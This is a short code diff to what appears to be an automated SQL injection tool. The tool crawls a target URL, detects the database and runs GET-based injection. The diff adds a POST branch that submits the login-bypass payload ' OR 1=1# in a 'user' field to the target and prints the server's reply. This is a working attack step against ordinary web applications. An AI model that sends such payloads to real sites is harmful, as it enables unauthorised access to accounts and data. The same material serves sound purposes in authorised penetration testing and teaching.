@@ -7,6 +7,8 @@ from GET.detection.get_db_detector import *
 
 from GET.injection.get_inject import *
 
+import requests
+
 
 
 
@@ -15,13 +17,22 @@ def main():
     scrapped_data = simple_crawler(target_url)
     
     
-    # write_scrapped_data(scrapped_data, output_file)
+    output_file = write_scrapped_data(scrapped_data, output_file, target_url)
 
 
     if "get" in request_method.lower():
         get_injection(identify_db_get(scrapped_data), output_file) 
     elif "post" in request_method.lower():
-        pass
+        
+        parametres = {
+            'user': "' OR 1=1#",
+            'password':"pass"
+        }
+        
+        response = requests.post(target_url, data=parametres)
+        
+        print(response.text)
+        
     else:
         print("Wrong method")
         
